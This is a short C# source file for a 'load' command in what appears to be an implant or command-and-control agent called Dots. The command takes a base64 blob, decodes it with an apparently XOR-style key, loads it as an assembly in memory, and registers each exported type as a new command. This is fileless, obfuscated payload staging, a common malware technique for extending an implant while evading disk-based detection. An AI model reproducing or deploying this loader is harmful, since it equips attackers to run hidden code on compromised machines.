using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using Dots.Models;

namespace Dots.Commands
{
    public class LoadCommand : DotsCommand
    {
        public override string Name => "load";
        public override DotsProperties DotsProperty { get; set; }

        public override string Execute(string[] args)
        {           
            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(args[0]), args[1]));

            List<string> loaded = new List<string>();

            foreach (Type type in assembly.GetExportedTypes())
            {
                string full_name = type.Name;
                try
                {
                    object command = Activator.CreateInstance(type);
                    DotsProperty.Commands.Add(command);
                    loaded.Add(full_name);
                } catch {
                    return loaded.Count() > 0 ? $"Failed to load {full_name}, successfully loaded {string.Join(", ", loaded)}" : $"Failed to load {full_name}";
                }

            }
            return $"Successfully loaded {string.Join(", ", loaded)}.";
        }
    }
}
